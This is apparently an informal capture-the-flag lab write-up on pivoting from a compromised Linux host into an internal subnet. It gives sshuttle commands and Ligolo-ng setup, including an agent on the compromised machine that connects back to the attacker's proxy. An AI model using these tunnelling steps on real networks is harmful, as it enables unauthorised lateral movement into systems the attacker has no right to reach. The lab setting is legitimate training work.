Let's see among the 5 host which we can ping ?_?

So 1st thing that came to my mind is sshuttle 
```
sshuttle -r linux-admin@10.201.11.33 -N
```

```
http://10.201.11.30/
```

So it was simple but but let's try it a different tool that i am trying to use for a long time
and yes you have guessed it right.


## Ligolo-ng

Let's set up the agent and upload the proxy in the compromised asset.

Proxy | Attacker :  10.51.9.13

Agent | Compromised Asset : 10.201.11.33

gunzip

tar -xvzf 

```
ip tuntap add user root mode tun ligolo
```

```
ip link set ligolo up
```

```
ip route add 10.201.11.0/24 dev ligolo
```

## Attacker
```
sudo ./proxy -selfcert
```


Compromised
```
chmod +x agent
```

```
./agent -connect 10.10.14.2:11601 -ignore-cert
```


So again the box got dead so i think i will not able to use option for some reason and wait for HTB dante.
